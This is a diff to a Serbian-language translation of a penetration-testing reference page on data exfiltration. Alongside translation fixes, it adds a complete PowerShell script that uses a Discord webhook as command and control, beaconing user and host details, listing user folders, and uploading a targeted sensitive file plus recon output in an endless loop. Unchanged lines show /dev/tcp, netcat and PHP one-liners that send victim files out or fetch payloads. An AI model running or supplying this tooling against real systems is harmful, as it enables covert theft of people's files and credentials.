@@ -1,12 +1,12 @@
-# Ekfiltracija
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Uobičajeni domeni na beloj listi za ekfiltraciju informacija
+## Često whitelisted domene za exfiltrate informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli uobičajene domene na beloj listi koje se mogu zloupotrebiti
+Proverite [https://lots-project.com/](https://lots-project.com/) da pronađete domene koji su često whitelisted i koje je moguće zloupotrebiti
 
-## Kopiraj\&Zalepi Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -42,7 +42,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload files
+### Otpremanje fajlova
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -100,19 +100,104 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) za C2 & Data Exfiltration
+
+Webhooks su write-only HTTPS endpoints koji prihvataju JSON i opciono file parts. Često su dozvoljeni za trusted SaaS domene i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za low-friction beaconing i exfiltration.
+
+Key ideas:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK potvrđuju isporuku.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Beleške:
+- Slični obrasci važe i za druge platforme za saradnju (Slack/Teams) koje koriste svoje incoming webhooks; prilagodite URL i JSON šemu u skladu s tim.
+- Za DFIR vezan za artefakte keša Discord Desktop-a i webhook/API recovery, pogledajte:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
-### FTP сервер (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP сервер (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP сервер (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -130,7 +215,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** клијент
+### **Windows** klijent
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte smb deljenje **koristeći samba**:
+Ili kreirajte smb share **koristeći samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Napadač mora imati pokrenut SSHd.
+attacker mora imati SSHd pokrenut.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ako žrtva ima SSH, napadač može montirati direktorijum sa žrtve na napadača.
+Ako žrtva ima SSH, napadač može da montira direktorijum sa žrtve na svoj sistem.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,19 +279,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzmi datoteku sa žrtve
+### Preuzimanje datoteke sa žrtve
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Učitajte datoteku na žrtvu
+### Otpremanje datoteke na metu
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-hvala **@BinaryShadow\_**
+zahvaljujući **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -228,33 +313,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete poslati podatke na SMTP server, možete kreirati SMTP za primanje podataka pomoću Pythona:
+Ako možete poslati podatke na SMTP server, možete kreirati SMTP server za primanje podataka pomoću python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u drugim verzijama mora se eksplicitno dodati tokom instalacije)
+Podrazumevano u XP i 2003 (u ostalim verzijama mora biti eksplicitno dodat tokom instalacije)
 
-U Kali, **start TFTP server**:
+U Kali, **pokrenite TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP сервер у Питону:**
+**TFTP server u python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-U **žrtvi**, povežite se na Kali server:
+Na **victim**, povežite se na Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Preuzmite datoteku sa PHP oneliner-om:
+Preuzmite fajl pomoću PHP onelinera:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb u veličini**.
+Program `debug.exe` ne samo da omogućava pregled binarnih fajlova, već ima i **sposobnost da ih rekonstruiše iz hex-a**. To znači da, pružanjem hex-a binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje sastavljanja fajlova do veličine od 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Zatim kopirajte i nalepite tekst u windows-shell i biće kreirana datoteka pod nazivom nc.exe.
+Zatim kopirajte i nalepite tekst u windows-shell i biće kreiran fajl pod imenom nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Reference
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
